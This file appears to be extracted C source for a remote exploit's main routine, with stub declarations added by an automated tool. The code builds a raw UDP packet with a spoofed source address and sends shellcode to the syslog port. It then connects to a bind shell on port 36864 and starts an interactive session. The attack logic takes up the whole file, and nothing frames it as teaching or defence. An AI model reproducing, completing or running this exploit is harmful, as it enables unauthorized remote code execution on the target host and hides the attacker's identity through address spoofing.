#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  u_long ;
struct udphdr {int len; void* dest; void* source; } ;
struct in_addr {int dummy; } ;
struct sockaddr_in {char sin_zero; struct in_addr sin_addr; void* sin_port; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
struct iphdr {int version; int ihl; int ttl; int /*<<< orphan*/  daddr; int /*<<< orphan*/  saddr; int /*<<< orphan*/  protocol; void* tot_len; } ;
struct hostent {scalar_t__ h_addr; } ;
typedef  int /*<<< orphan*/  spoof_ip ;
typedef  int /*<<< orphan*/  host ;
struct TYPE_2__ {int l_sz; int /*<<< orphan*/  shell; } ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 size_t D_M ; 
 int D_PORT ; 
 char* FK_IP ; 
 int /*<<< orphan*/  IPPROTO_IP ; 
 int /*<<< orphan*/  IPPROTO_RAW ; 
 int /*<<< orphan*/  IPPROTO_UDP ; 
 int /*<<< orphan*/  IP_HDRINCL ; 
 char* LC_TEST ; 
 int /*<<< orphan*/  SOCK_RAW ; 
 int atoi (char*) ; 
 int /*<<< orphan*/  banrl () ; 
 int /*<<< orphan*/  exit (int) ; 
 int /*<<< orphan*/  fprintf (int /*<<< orphan*/ ,char*,...) ; 
 struct hostent* gethostbyname (char*) ; 
 int getopt (int,char**,char*) ; 
 int /*<<< orphan*/  herror (char*) ; 
 void* htons (int) ; 
 int /*<<< orphan*/  inet_addr (char*) ; 
 int /*<<< orphan*/  inet_ntoa (struct in_addr) ; 
 scalar_t__ make_sh (int /*<<< orphan*/ ,int) ; 
 scalar_t__ malloc (int) ; 
 int /*<<< orphan*/  memset (char*,size_t,int) ; 
 int /*<<< orphan*/  perror (char*) ; 
 TYPE_1__* plat ; 
 int /*<<< orphan*/  re_connt (int) ; 
 int /*<<< orphan*/  send_recv_sh (int) ; 
 int sendto (int,char*,int,size_t,struct sockaddr*,int) ; 
 scalar_t__ setsock (char*,int) ; 
 int setsockopt (int,int /*<<< orphan*/ ,int /*<<< orphan*/ ,char*,int) ; 
 int /*<<< orphan*/  sleep (int) ; 
 int socket (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  stdout ; 
 int strlen (char*) ; 
 int /*<<< orphan*/  strncpy (char*,char*,int) ; 
 int /*<<< orphan*/  strtoul (char*,int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  usage (char*) ; 

int main(int argc,char **argv)
{
	int sock,whgl,type=D_M;
	struct hostent *he;
	struct sockaddr_in hehe;
	struct iphdr *__ip_hdr_st;
	struct udphdr *__udp_hdr_st;
#ifdef _TEST
#define FK_IP "82.82.82.82" /* fake src ip */
#else
#define FK_IP "216.239.33.101" /* G00Gl3 */
#endif
	char spoof_ip[0x82]=FK_IP;
#define D_PORT (36864)
	int port=D_PORT;
#define _DMN_NAME
#ifdef _DMN_NAME
#define LC_TEST "localhost" /* default test host */
#else
#define LC_TEST "127.0.0.1" /* localhost */
#endif 
	char host[0x82]=LC_TEST;
#ifdef T_ADDR_
#define SHELL 0x82828282 /* test */
#endif
	u_long shell=plat[type].shell;
	int l_sz=plat[type].l_sz;
	int atk_pk_size,make_sh_size;
	char *__tot_atk_pk,*atk_mbuf;

	(void)banrl();
	if(argc<2)
	{
		(void)usage(argv[D_M]);
	}

	while((whgl=getopt(argc,argv,"L:l:H:h:F:f:T:t:IiS:s:"))!=-1)
	{
		extern char *optarg;
		switch(whgl)
		{
			case 'H':
			case 'h':
				memset((char *)host,D_M,sizeof(host));
				strncpy(host,optarg,sizeof(host)-1);
				break;
				
			case 'F':
			case 'f':
				memset((char *)spoof_ip,D_M,sizeof(spoof_ip));
				strncpy(spoof_ip,optarg,sizeof(spoof_ip)-1);
				break;
				
			case 'L':
			case 'l':
				l_sz=atoi(optarg);
				break;
				
			case 'T':
			case 't':
				type=atoi(optarg);
				if(type>4)
					(void)usage(argv[D_M]);
				else
				{
					shell=plat[type].shell;
					l_sz=plat[type].l_sz;
				}
				break;
				
			case 'S':
			case 's':
				shell=strtoul(optarg,NULL,NULL);
				break;
				
			case 'I':
			case 'i':
				(void)usage(argv[D_M]);
				break;
				
			case '?':
				fprintf(stderr," Try `%s -i' for more information.\n\n",argv[D_M]);
				exit(-1);
				break;
		}
	}
	{
	    	fprintf(stdout," [0] Set packet code size.\n");
		make_sh_size=strlen((char *)make_sh(shell,l_sz));
		atk_pk_size=(sizeof(struct iphdr)+
				sizeof(struct udphdr)+make_sh_size);
		__tot_atk_pk=(char *)malloc(atk_pk_size);
		memset((char *)__tot_atk_pk,D_M,atk_pk_size);
		atk_mbuf=(sizeof(struct iphdr)+
				sizeof(struct udphdr)+
				(char *)__tot_atk_pk);
		fprintf(stdout," [1] Set protocol header.\n");
		__ip_hdr_st=(struct iphdr *)__tot_atk_pk;
		__udp_hdr_st=(struct udphdr *)(sizeof(struct iphdr)+__tot_atk_pk);
		fprintf(stdout," [2] Make shellcode.\n");
		strncpy(atk_mbuf,(char *)make_sh(shell,l_sz),make_sh_size);
	}

	if((he=gethostbyname(host))==NULL)
	{
		herror(" gethostbyname()");
		exit(-1);
	}
	if((sock=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))==-1)
	{
		perror(" socket()");
		exit(-1);
	}
	if(setsockopt(sock,IPPROTO_IP,IP_HDRINCL,"1",sizeof("1"))==-1)
	{
		perror(" setsockopt()");
		exit(-1);
	}

	fprintf(stdout," [3] Set rawsock.\n");

	__ip_hdr_st->version=4;
	__ip_hdr_st->ihl=sizeof(struct iphdr)/4;
	__ip_hdr_st->tot_len=htons(atk_pk_size);
	__ip_hdr_st->ttl=0xff;
	__ip_hdr_st->protocol=IPPROTO_UDP;
	__ip_hdr_st->saddr=inet_addr(spoof_ip);
	__ip_hdr_st->daddr=inet_ntoa(*((struct in_addr *)he->h_addr));

	__udp_hdr_st->source=htons(0x82);
	__udp_hdr_st->dest=htons(0x202);
	__udp_hdr_st->len=(atk_pk_size);

	hehe.sin_family=AF_INET;
	hehe.sin_port=__udp_hdr_st->dest;
	hehe.sin_addr=*((struct in_addr *)he->h_addr);
	memset(&(hehe.sin_zero),D_M,(8));
	
	fprintf(stdout," [4] Send packet.\n");

	if((sendto(sock,__tot_atk_pk,atk_pk_size,D_M,(struct sockaddr *)&hehe,sizeof(struct sockaddr)))==-1)
	{
		perror(" sendto()");
		exit(-1);
	}

	fprintf(stdout," [5] Trying %s:%d.\n",host,port);
	sleep(2);
	sock=(int)setsock(host,port);
	(void)re_connt(sock);
	
	fprintf(stdout," [*] Connected to %s:%d.\n",host,port);
	(void)send_recv_sh(sock);
}